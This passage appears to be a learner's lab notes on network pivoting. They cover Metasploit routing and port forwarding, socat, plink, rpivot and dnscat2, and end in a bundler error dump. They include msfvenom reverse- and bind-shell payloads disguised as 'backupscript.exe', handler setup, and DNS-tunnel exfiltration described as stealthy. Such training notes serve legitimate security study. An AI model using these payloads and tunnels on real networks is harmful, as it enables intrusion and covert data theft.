&lt;p&gt;&lt;code&gt;run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can also do a ping sweep with a for loop in bash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;1..254&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; ;&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ping -c &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 172.16.5.$i | grep “bytes from” &amp;amp;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; ;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; /L %i in &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 254&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; ping 172.16.5.%i -n &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -w &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; | find “Reply”
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;.254&lt;/span&gt; | % {&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;172.16&lt;/span&gt;.5.$($_)&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; $(Test-Connection -count &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -comp &lt;span style=&#34;color:#ae81ff&#34;&gt;172.15&lt;/span&gt;.5.$($_) -quiet)&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A ping sweep may not work the first time you run it, because a host may not have built it’s arp cache yet. You should run this twice to make sure you know have the arp cache.&lt;/p&gt;
&lt;p&gt;There might be scenarios where we cannot do a ping sweep, because of the firewall. In this case, we need to do a TCP scan on the 172.16.5.0/23 network. We can use NMAP for this, as well as Metasploit’s post-exploitation roting module called socks_proxy to configure a local netowrk proxy on our attack host. We can configure the socks proxy for v4, and this will start us a listener on port 9050 and route all of that traffic recived through our meterpreter session.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msf6 &amp;gt; use auxiliary/server/socks_proxy&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We will also need to make sure to configure our proxy.&lt;/p&gt;
&lt;p&gt;Once this server is up and running, we can configure proxychains to route traffic to our pivot on the ubuntu host. Make sure to add the line discussed above to the end of the file.&lt;/p&gt;
&lt;p&gt;After that, we need to tell our socks_proxy module to route the traffic via our meterpreter session, we can use the &lt;code&gt;post/multi/manage/autoroute&lt;/code&gt; mod from Metasploit to add these routes for the 172.16.5.0 subnet and then route the traffic from proxychains.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msf6 &amp;gt; use post/multi/manage/autoroute&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;we can also do this from the Meterpreter session.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;run autoroute -s 172.16.5.0/23&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can use the &lt;code&gt;portfwd&lt;/code&gt; module on Meterpreter to enable a listner on our attack host, and then forward all of our packets to the attack host. This command below asks to create a listener on the attack host’s local port of 3300, and then forwards all these packets to the remote windows server on port 3389 through our meterpreter session.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;meterpreter &amp;gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Again, using xfreerdp, we can now create a remote desktop session.&lt;/p&gt;
&lt;p&gt;Meterpreter can also reverse port forward where we can listen on a specific port on the server and send all shells from the ubuntu server to our attack host.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;portfwd add -R -l 8081 -p 1234 -L 10.10.14.18&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;socat-redirection-with-a-reverse-shell&#34;&gt;Socat Redirection with a Reverse Shell&lt;/h2&gt;
&lt;p&gt;Socat is a tool that we can use to relay and create pipe sockets between 2 independtent network chanels without needing to use SSH tunneling. It acts a redirector that can listen and forward data between hosts. This is the same principal as SSH Tunneling, but isn’t the exact thing.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This command tells us that Socat will be listening on 8080, and forward our traffic to port 80 on the attack host. We can use this to create a payload and send it to the Socat, allowing us to access the vulnerable windows host yet again.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;To get this to the host, we can use a technique we did in the last one.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;scp backupscript.exe ubuntu@&amp;lt;ipAddressofTarget&amp;gt;:~/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Then,&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 &amp;gt; use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &amp;gt; set payload windows/x64/meterpreter/reverse_https
payload =&amp;gt; windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) &amp;gt; set lhost 0.0.0.0
lhost =&amp;gt; 0.0.0.0
msf6 exploit(multi/handler) &amp;gt; set lport 80
lport =&amp;gt; 80
msf6 exploit(multi/handler) &amp;gt; run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 id=&#34;socat-redirection-with-a-bind-shell&#34;&gt;Socat Redirection with a Bind Shell&lt;/h2&gt;
&lt;p&gt;Similar to socat’s reverse shell redirector, the same technique can also be applied to bind shells. This is not the same as reverse shells because those connect from the windows server, and then back to us. A bind shell will start a listener on a specific port of a machine. This payload will be executed on the Window smachine, and then be redirected through a socat listener on our Ubuntu machine by connecting through &lt;code&gt;port 8443&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%204.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can use msfvenom to create our payload.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8843&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Then, we will use socat on the ubuntu machine to create a listener to port forward from.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Finally, we can start our bind handler on metasploit.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 &amp;gt; use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &amp;gt; set payload windows/x64/meterpreter/bind_tcp
payload =&amp;gt; windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) &amp;gt; set RHOST 10.129.202.64
RHOST =&amp;gt; 10.129.202.64
msf6 exploit(multi/handler) &amp;gt; set LPORT 8080
LPORT =&amp;gt; 8080
msf6 exploit(multi/handler) &amp;gt; run

[*] Started bind TCP handler against 10.129.202.64:8080
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 id=&#34;ssh-for-windows-plinkexe&#34;&gt;SSH for Windows: plink.exe&lt;/h2&gt;
&lt;p&gt;Plink is an application and cmd ssh tool that is on any PuTTY package. This can be used to create a dyanmic port fowards and SOCKS Proxies. PuTTY is how most Windows users downloaded ssh onto the operating system.&lt;/p&gt;
&lt;p&gt;We’ll use this as an example.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%205.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;The Windows attack host uses the Plink as a process. Starting this in Windows is as easy as using this command line argurment,&lt;/p&gt;
&lt;p&gt;&lt;code&gt;plink -D 9050 ubuntu@10.129.15.50&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This will start our SSH session between Windows and Ubutnu, and allows us to port forward between the two computers.&lt;/p&gt;
&lt;p&gt;We can also use the tool titled &lt;a href=&#34;https://www.proxifier.com/&#34;&gt;Proxifer&lt;/a&gt;, which will allow us to start SOCKS Tunnels through the SSH Session we created. This allows us to proxy chain over windows.&lt;/p&gt;
&lt;p&gt;Once everything has been set, we can use mstsc.exe to start our RDP session with a windows target.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;web-server-pivoting-with-rpivot&#34;&gt;Web Server Pivoting with Rpivot&lt;/h2&gt;
&lt;p&gt;Rpivot is a reverse SOCKS proxy tool made in python that allows of SOCKS Tunneling. This will bind a machine in a netwrok to a server that exists outside of it, and then allow us to connect throguh that server.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%206.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;We first need to install it through github.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo git clone https://github.com/klsecservices/rpivot.git&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo apt-get install python2.7&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;we then can start our rpviot SOCKS proxy with &lt;code&gt;server.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python2.7 [server.py](http://server.py) —proxy-port 9050 —server-port 9999 —server-ip 0.0.0.0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Before we run &lt;a href=&#34;http://client.py&#34;&gt;client.py&lt;/a&gt; we need to move rpivot to the target, and we cna do this using scp.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;scp -r rpivot ubuntu@&amp;lt;IpaddressOfTarget&amp;gt;:/home/ubuntu/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Once we’re on the actual pivot host, we need to connect to the client.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999Backconnecting to server 10.10.14.18 port &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once we’re on here, we can set proxychains to pivot from our local server on 127.0.0.1:9050, and we can access this webserver from our server, and access it through &lt;code&gt;proxychains firefox-esr 172.16.5.135:80.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Finally, there can be times whne we can’t pivot through the external server, because of NTLM authneticaiton confiugrations with the domain controlller. In these cases, we can use NTLM to allow rpivot to authentiate via NTLM proxy by providing a username and password. We can use our proxy with &lt;a href=&#34;http://client.py&#34;&gt;client.py&lt;/a&gt; like this.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python client.py --server-ip &amp;lt;IPaddressofTargetWebServer&amp;gt; --server-port 8080 --ntlm-proxy-ip &amp;lt;IPaddressofProxy&amp;gt; --ntlm-proxy-port 8081 --domain &amp;lt;nameofWindowsDomain&amp;gt; --username &amp;lt;username&amp;gt; --password &amp;lt;password&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Couldn’t get this one figured out tbh, issue w python install lol&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;dns-tunneling-with-dnscat2&#34;&gt;DNS Tunneling with Dnscat2&lt;/h2&gt;
&lt;p&gt;Dnscat2 is a tunnleing tool that use the DNS protocol to send data between two hosts. It uses an eecnryptued C2 channel and sends data thru TXT records within the DNS protocol. AD will usually have it’s own DNS server, which will resovle hostsnames ot IPs and route these traffics to DNS. However, this addres resoultion, with dnscat2, is done through an external server. This is because when a local DNS server attempts to resolve an address, the data is exlfiltraed and sent over the netowrk, instead of a legitamte DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data when avoidning firewall detections, which sniff traffic. For our example, we can use this to get to the Windows hosts.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git clone https://github.com/iagox86/dnscat2.git&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd dnscat2/server/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo gem install bundler
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bundle install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ran into these errors:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Fetching gem metadata from https://rubygems.org/.......
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Fetching ecdsa 1.2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Fetching salsa20 0.1.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Fetching trollop 2.1.2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Fetching sha3 1.0.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/ecdsa-1.2.0.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/trollop-2.1.2.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/ecdsa-1.2.0.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/trollop-2.1.2.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/ecdsa-1.2.0.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/trollop-2.1.2.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/salsa20-0.1.1.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/salsa20-0.1.1.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/sha3-1.0.1.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/salsa20-0.1.1.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/sha3-1.0.1.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Retrying download gem from https://rubygems.org/ due to error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4/4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Bundler::PermissionError There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/sha3-1.0.1.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bundler::PermissionError: There was an error &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; trying to write to
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/lib/gems/3.0.0/cache/ecdsa-1.2.0.gem&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;. It is likely that you need to grant write permissions
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; that path.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/shared_helpers.rb:105:in &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;rescue in
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;filesystem_access&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/shared_helpers.rb:102:in `filesystem_access&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/rubygems_integration.rb:483:in &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;block in
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;download_gem&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/retry.rb:40:in `run&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/retry.rb:30:in &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;attempt&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/rubygems_integration.rb:474:in `download_gem&amp;#39;&lt;/span&gt;
